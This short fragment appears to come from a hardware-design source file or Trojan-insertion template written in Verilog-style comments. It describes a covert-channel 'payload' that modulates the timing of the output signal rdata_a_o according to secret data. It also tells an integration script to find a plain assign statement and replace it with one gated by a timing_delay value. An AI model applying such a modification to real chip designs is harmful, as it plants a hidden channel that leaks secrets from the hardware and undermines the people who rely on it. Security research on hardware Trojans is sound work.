 ...
 * Payload: Modulate timing of rdata_a_o based on secret data
 * 
...
// ============================================================
// Covert Channel: Modulate timing of rdata_a_o
//
// Integration Script Must Modify:
//
// IF rdata_a_o is timing-sensitive:
//   Find: assign rdata_a_o = ready_signal;
//   Replace: assign rdata_a_o = (timing_delay == 0) ? ready_signal : 1'b0;
//
